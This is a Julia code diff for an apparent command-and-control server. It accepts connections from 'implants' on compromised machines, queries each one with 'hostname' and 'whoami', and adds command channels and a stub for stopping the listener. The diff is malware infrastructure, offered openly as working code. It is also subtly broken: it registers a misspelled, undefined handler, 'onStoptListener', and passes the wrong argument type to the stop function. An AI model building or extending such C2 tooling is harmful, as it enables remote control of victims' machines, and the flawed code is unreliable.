@@ -10,12 +10,9 @@ function sendCommand(conn, cmd::String)
     return response
 end
 
-function handleNewImplant(conn, bus :: MessageBus, listenerId::String)
+function handleNewImplant(conn, bus :: MessageBus, listenerId::String, commandsChannel :: Channel)
     id = string(uuid4())
     println("New implant connected $id")
-
-    sockName = getsockname(conn)
-    println("Socket name: $sockName")
 
     hostname = sendCommand(conn, "hostname")
     user = sendCommand(conn, "whoami")
@@ -51,11 +48,17 @@ function onStartListener(ev::StartListener, bus:: MessageBus)
         server = Sockets.listen(ev.port)
         while true # TODO maybe create Event to stop  here and return the event as result event from this fn, so the event can be set somewhere else
             sock = Sockets.accept(server)
-            errormonitor(@async handleNewImplant(sock, bus, listenerId))
+            ch = Channel{String}(32)
+            errormonitor(@async handleNewImplant(sock, bus, listenerId, ch))
         end
         @warn "Listener stopped"
     end)
     return ListenerReady(listenerId, ev.port, listenerTask)
+end
+
+function onStopListener(ev::StopListener, channel:: Channel)
+    # TODO stop listener
+    return ListenerStopped(ev.listenerId)
 end
 
 function startC2(bus:: MessageBus)
@@ -64,4 +67,5 @@ function startC2(bus:: MessageBus)
     publish!(bus, ev)
 
     register!(bus, StartListener, (ev) -> onStartListener(ev, bus))
+    register!(bus, StopListener, (ev) -> onStoptListener(ev, bus))
 end 
